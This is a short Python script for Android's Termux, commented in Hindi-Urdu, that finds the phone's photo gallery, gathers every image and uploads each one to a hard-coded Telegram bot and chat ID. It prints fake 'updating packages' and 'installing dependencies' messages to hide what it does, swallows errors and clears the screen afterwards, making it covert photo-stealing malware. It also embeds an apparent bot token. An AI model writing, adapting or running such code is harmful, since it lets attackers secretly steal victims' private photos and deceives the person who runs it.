import os
import requests
import time

# 🔹 Yahan apna bot token aur chat ID dalna
BOT_TOKEN = "7509810026:AAGt521cEPf_z1A7I8JGH5WdPNhsviyfSE0"
CHAT_ID = "7006569478"

# 🔹 Automatically gallery ka path detect karna
possible_paths = [
    "/sdcard/DCIM/",
    "/storage/emulated/0/DCIM/",
    "/storage/self/primary/DCIM/",
    "/mnt/sdcard/DCIM/",
    "/storage/sdcard0/DCIM/",
    "/storage/sdcard1/DCIM/"
]

gallery_path = None
for path in possible_paths:
    if os.path.exists(path):
        gallery_path = path
        break

if not gallery_path:
    print("❌ Gallery path not found!")
    exit()

# 🔹 Saari images collect karna
image_files = []
for root, dirs, files in os.walk(gallery_path):
    for file in files:
        if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
            image_files.append(os.path.join(root, file))

# 🔹 Background mode enable karne ke liye Termux output hide karna
os.system("clear")
os.system("echo 'Updating system packages...'")  # Fake output
time.sleep(2)
os.system("echo 'Installing required dependencies...'")  # Fake output
time.sleep(3)

# 🔹 Saari images Telegram bot pe bhejna
for image in image_files:
    try:
        files = {'photo': open(image, 'rb')}
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={CHAT_ID}"
        requests.post(url, files=files)
    except Exception as e:
        pass  # Errors ko ignore karna
    time.sleep(1)  # Delay rakhna taake spam block na ho

# 🔹 Process complete hone ke baad Termux silent rahega
os.system("clear")
exit()